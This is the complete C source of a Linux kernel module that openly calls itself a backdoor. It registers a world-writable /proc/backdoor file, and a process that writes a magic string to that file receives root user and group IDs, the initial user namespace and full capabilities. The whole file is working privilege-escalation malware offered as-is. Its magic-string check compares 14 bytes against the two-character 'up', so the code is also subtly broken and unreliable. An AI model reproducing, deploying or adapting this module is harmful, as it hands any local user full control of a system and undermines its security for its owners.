#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/capability.h>
#include <linux/user_namespace.h>
#include <linux/string.h>

#define PROC_NAME "backdoor"
#define MAGIC_STR "up"
#define MAGIC_LEN 14

static ssize_t backdoor_write(struct file *file, const char __user *buffer,
                              size_t count, loff_t *off)
{
    char buf[MAGIC_LEN];
    struct cred *new;

    if (count < MAGIC_LEN)
	{
        return -EINVAL;
	}
    if (copy_from_user(buf, buffer, MAGIC_LEN))
    {
		return -EFAULT;
	}
    if (memcmp(buf, MAGIC_STR, MAGIC_LEN))
    {
	    return -EINVAL;
	}
    new = prepare_creds();
    if (!new)
	{
        return -ENOMEM;
	}
    new->uid = new->euid = new->suid = new->fsuid = 0;
    new->gid = new->egid = new->sgid = new->fsgid = 0;
    new->user_ns = &init_user_ns;

    cap_set_full(&new->cap_effective);
    cap_set_full(&new->cap_inheritable);
    cap_set_full(&new->cap_permitted);

    commit_creds(new);
    return count;
}

static struct proc_ops backdoor_proc_ops = {
    .proc_write = backdoor_write,
};

static int __init backdoor_init(void)
{
    struct proc_dir_entry *entry;
    entry = proc_create(PROC_NAME, 0666, NULL, &backdoor_proc_ops);
    if (!entry)
	{
        return -ENOMEM;
	}
    pr_info("backdoor loaded\n");
    return 0;
}

static void __exit backdoor_exit(void)
{
    remove_proc_entry(PROC_NAME, NULL);
    pr_info("backdoor unloaded\n");
}

module_init(backdoor_init);
module_exit(backdoor_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("PlayingPeano");
MODULE_DESCRIPTION("backdoor");
MODULE_VERSION("0.1");